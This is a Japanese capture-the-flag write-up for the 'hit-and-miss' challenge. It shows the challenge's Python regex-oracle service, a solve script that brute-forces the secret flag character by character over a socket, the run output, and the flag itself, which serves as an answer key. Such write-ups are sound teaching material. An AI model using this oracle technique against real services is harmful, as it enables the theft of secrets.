# hit-and-miss

> みんな大好き正規表現🧩  
> `nc 34.170.146.252 46849`

[hit-and-miss.tar.gz](https://alpacahack-prod.s3.ap-northeast-1.amazonaws.com/26afd84f-223c-48e8-a446-633f4a939320/hit-and-miss.tar.gz)が提供される

解凍すると以下のファイルがある。

```bash
> ls
Dockerfile  app.py  compose.yaml
```

app.py見る
```py
import os, re

FLAG = os.environ.get("FLAG", "Alpaca{REDACTED}")
assert re.fullmatch(r"Alpaca\{\w+\}", FLAG)

while pattern := input("regex> "):
    if re.match(pattern, FLAG):
        print("Hit!")
    else:
        print("Miss...")
```


１文字ずつ確定させていく

```py
import socket
import string
import time

HOST = "34.170.146.252"
PORT = 46849

charset = string.ascii_letters + string.digits + "_"

def query(pattern: str) -> bool:
    with socket.create_connection((HOST, PORT)) as s:
        s.recv(1024)  # "regex> "
        s.sendall(pattern.encode() + b"\n")
        res = s.recv(1024)
        return b"Hit!" in res

flag = "Alpaca{"

print("[*] start brute force")

while True:
    found = False
    for c in charset:
        pat = f"^{flag}{c}"
        if query(pat):
            flag += c
            print("[+] hit:", flag)
            found = True
            break

    if not found:
        # 次が無い → } のはず
        flag += "}"
        break

print("\n[FLAG]", flag)

```

実行してみる

```bash
> python solve.py
[*] start brute force
[+] hit: Alpaca{R
[+] hit: Alpaca{Re
[+] hit: Alpaca{Reg
[+] hit: Alpaca{Reg3
[+] hit: Alpaca{Reg3x
[+] hit: Alpaca{Reg3x_
[+] hit: Alpaca{Reg3x_C
[+] hit: Alpaca{Reg3x_Cr
[+] hit: Alpaca{Reg3x_Cro
[+] hit: Alpaca{Reg3x_Cros
[+] hit: Alpaca{Reg3x_Cross
[+] hit: Alpaca{Reg3x_Crossw
[+] hit: Alpaca{Reg3x_Crossw0
[+] hit: Alpaca{Reg3x_Crossw0r
[+] hit: Alpaca{Reg3x_Crossw0rd

[FLAG] Alpaca{Reg3x_Crossw0rd}
```

flag: `Alpaca{Reg3x_Crossw0rd}`
